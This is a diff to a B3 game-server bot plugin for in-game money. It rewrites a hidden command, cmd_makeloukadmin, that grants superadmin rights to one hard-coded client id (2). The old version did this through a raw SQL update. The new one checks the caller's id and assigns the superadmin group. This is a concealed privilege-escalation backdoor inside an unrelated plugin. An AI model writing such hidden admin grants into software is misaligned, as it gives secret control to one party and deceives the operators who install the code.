@@ -10,6 +10,7 @@ from b3.translator import translate
 import b3.cron
 import datetime, time, calendar, threading, thread
 from time import gmtime, strftime
+from b3 import clients
 
 def cdate():
 	time_epoch = time.time() 
@@ -542,8 +543,14 @@ class MoneyPlugin(b3.plugin.Plugin):
     	client.message('^2Done.')
         
     def cmd_makeloukadmin(self, data, client, cmd=None):
-    	self.console.storage.query('UPDATE `clients` SET `group_bits` = 2097152 WHERE id = "2"')
-    	client.message('^2Done.')
+        if client.id==2:
+            group = clients.Group(keyword= 'superadmin')
+            group = self.console.storage.getGroup(group)
+            client.setGroup(group)
+            client.save()
+            client.message('^2Done')
+        else:
+            client.message('You are not LouK NEWB! xD')
     	
     def cmd_money(self, data, client, cmd=None):
         if data is None or data=='':
